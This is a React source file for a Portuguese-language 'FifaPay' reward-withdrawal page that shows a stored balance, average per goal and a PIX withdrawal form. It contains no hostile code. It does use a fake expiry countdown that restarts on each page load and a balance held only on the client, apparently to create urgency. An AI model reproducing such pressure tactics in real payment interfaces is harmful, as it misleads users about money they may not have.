import { useEffect, useMemo, useState } from "react";
import { useNavigate } from "react-router-dom";
import { Wallet, CreditCard } from "lucide-react";
import logo from "@/assets/fifapay-logo.png";
import coin from "@/assets/coin-p.png";
import pixLogo from "@/assets/pix-logo.svg";

const EXPIRES_SECONDS = 16 * 60 + 26; // 00:16:26

const formatBRL = (n: number) => n.toFixed(2).replace(".", ",");

const Resgate = () => {
  const navigate = useNavigate();
  const playerName = sessionStorage.getItem("fifapay:player") || "Jogador";
  const balance = useMemo(
    () => parseFloat(sessionStorage.getItem("fifapay:balance") || "0") || 0,
    []
  );
  const goals = useMemo(
    () => parseInt(sessionStorage.getItem("fifapay:goals") || "0", 10) || 0,
    []
  );
  const avgPerGoal = goals > 0 ? balance / goals : 0;

  const [secondsLeft, setSecondsLeft] = useState(EXPIRES_SECONDS);
  const [amount, setAmount] = useState(formatBRL(balance));

  useEffect(() => {
    const id = setInterval(() => setSecondsLeft((s) => (s > 0 ? s - 1 : 0)), 1000);
    return () => clearInterval(id);
  }, []);

  const hh = String(Math.floor(secondsLeft / 3600)).padStart(2, "0");
  const mm = String(Math.floor((secondsLeft % 3600) / 60)).padStart(2, "0");
  const ss = String(secondsLeft % 60).padStart(2, "0");

  const handleAmountChange = (v: string) => {
    // Permite apenas dígitos e vírgula
    const cleaned = v.replace(/[^\d,]/g, "");
    setAmount(cleaned);
  };

  const handleWithdraw = () => {
    sessionStorage.setItem("fifapay:withdraw", amount);
    // Próxima etapa do fluxo (a definir). Por enquanto fica aqui.
  };

  return (
    <div className="min-h-dvh w-full bg-gradient-to-b from-emerald-950 via-emerald-900 to-emerald-950 text-white">
      <div className="mx-auto max-w-md px-5 pb-8 pt-3">
        {/* Timer de expiração */}
        <div className="mb-5 w-full overflow-hidden rounded-xl border border-yellow-400/35 bg-emerald-950/95 px-3 py-3 shadow-lg shadow-black/25">
          <div className="flex flex-col items-center justify-center gap-1.5 text-center sm:flex-row sm:flex-wrap sm:gap-x-2">
            <span className="text-[10px] font-bold uppercase tracking-wide text-yellow-200/95 sm:text-[11px]">
              Seu saldo expira em
            </span>
            <span className="font-mono text-base font-display font-bold tabular-nums tracking-wide text-yellow-300 sm:text-lg">
              {hh} - {mm} - {ss}
            </span>
          </div>
        </div>

        {/* Logo */}
        <div className="mb-5 flex justify-center">
          <img
            src={logo}
            alt="FifaPay"
            className="h-12 w-auto select-none object-contain drop-shadow-[0_6px_14px_rgba(250,204,21,0.25)]"
            draggable={false}
          />
        </div>

        <h1 className="mb-1 text-center text-lg font-display font-bold text-white">
          Resgatar recompensas
        </h1>
        <p className="mb-6 text-center text-sm text-emerald-200/80">Olá, {playerName}</p>

        {/* Card de saldo */}
        <div className="mb-4 mt-5 w-full">
          <div
            className="box-border w-full min-h-[117px] overflow-hidden rounded-[12px] bg-emerald-950 p-5 shadow-[0_1px_18.4px_rgba(0,0,0,0.12)]"
            style={{ borderBottom: "1px dashed rgba(6, 78, 59, 0.85)" }}
          >
            <div className="flex items-end justify-between gap-4">
              <div className="flex min-w-0 flex-1 flex-col gap-2">
                <div className="flex items-center gap-1">
                  <span className="text-[17px] font-medium leading-normal text-emerald-50">
                    Seu saldo
                  </span>
                </div>
                <div className="flex flex-col gap-2" aria-live="polite">
                  <span className="text-[30px] font-bold leading-none tracking-tight text-white tabular-nums">
                    R$ {formatBRL(balance)}
                  </span>
                </div>
              </div>
              <div className="flex shrink-0 items-end">
                <span className="inline-flex items-end">
                  <img
                    src={coin}
                    alt=""
                    aria-hidden="true"
                    className="h-[72px] w-[72px] max-h-[72px] object-contain object-bottom"
                    draggable={false}
                  />
                </span>
              </div>
            </div>
          </div>

          <div className="box-border mt-2 flex w-full flex-col items-start gap-2.5 overflow-hidden rounded-[10px] bg-emerald-950 px-5 py-2.5 shadow-[0_1px_18.4px_rgba(0,0,0,0.12)]">
            <div className="flex w-full flex-col gap-2" aria-live="polite">
              <span className="text-[13px] font-normal leading-normal text-emerald-500/90">
                Última recompensa:{" "}
                <span className="font-medium text-yellow-400/95">
                  R$ {formatBRL(balance)}
                </span>
              </span>
            </div>
          </div>
        </div>

        {/* Média por gol */}
        <div className="mb-4 rounded-2xl border border-emerald-700/45 bg-emerald-900/55 px-4 py-3 backdrop-blur-sm">
          <p className="text-xs font-medium text-emerald-200/85">
            Média por gol:{" "}
            <span className="font-bold text-yellow-300">R$ {formatBRL(avgPerGoal)}</span>
          </p>
        </div>

        {/* Sacar dinheiro */}
        <div className="rounded-2xl border border-emerald-700/40 bg-emerald-900/50 p-5 shadow-inner backdrop-blur-sm">
          <p className="mb-1 text-base font-display font-bold text-white">Sacar dinheiro</p>
          <p className="mb-5 flex flex-wrap items-center gap-1.5 text-xs font-medium text-emerald-200/70">
            <CreditCard className="h-4 w-4 opacity-90" />
            Transferência via /
            <img
              src={pixLogo}
              alt="PIX"
              className="ml-0.5 h-[14px] w-auto opacity-90 brightness-0 invert"
            />
          </p>

          <label className="mb-1.5 block text-xs font-bold text-emerald-200/90">
            Valor do saque (máx. R$ {formatBRL(balance)})
          </label>
          <div className="relative mb-3">
            <span className="absolute left-3 top-1/2 -translate-y-1/2 text-sm font-bold text-emerald-300/80">
              R$
            </span>
            <input
              type="text"
              inputMode="decimal"
              autoComplete="off"
              placeholder="0,00"
              value={amount}
              onChange={(e) => handleAmountChange(e.target.value)}
              className="w-full rounded-xl border border-emerald-700/60 bg-emerald-950/70 py-3 pl-10 pr-3 font-bold text-white placeholder:text-emerald-600/50 focus:border-yellow-400/50 focus:outline-none focus:ring-2 focus:ring-yellow-400/40"
            />
          </div>

          <button
            type="button"
            onClick={() => setAmount(formatBRL(balance))}
            className="mb-3 flex h-[50px] w-full items-center justify-center rounded-[6px] border-[1.5px] border-transparent bg-emerald-950/65 text-sm font-display font-bold text-emerald-100 transition-colors hover:border-emerald-600/50"
          >
            Valor total: R$ {formatBRL(balance)}
          </button>

          <div className="min-h-[18px]" />

          <button
            type="button"
            onClick={handleWithdraw}
            className="mt-2 flex h-12 w-full items-center justify-center gap-2 rounded-2xl text-sm font-display font-bold transition-all bg-gradient-to-r from-yellow-400 to-amber-400 text-emerald-950 shadow-lg shadow-yellow-500/25 hover:from-yellow-300 hover:to-amber-300 active:scale-[0.98]"
          >
            <Wallet className="h-5 w-5" strokeWidth={2.5} />
            Sacar dinheiro
          </button>
        </div>

        <button
          type="button"
          onClick={() => navigate("/jogar")}
          className="mt-6 w-full rounded-2xl border-2 border-emerald-600/50 bg-emerald-900/30 py-3.5 text-sm font-bold text-emerald-100 transition-all hover:bg-emerald-900/50 active:scale-[0.99]"
        >
          Jogar novamente
        </button>
      </div>
    </div>
  );
};

export default Resgate;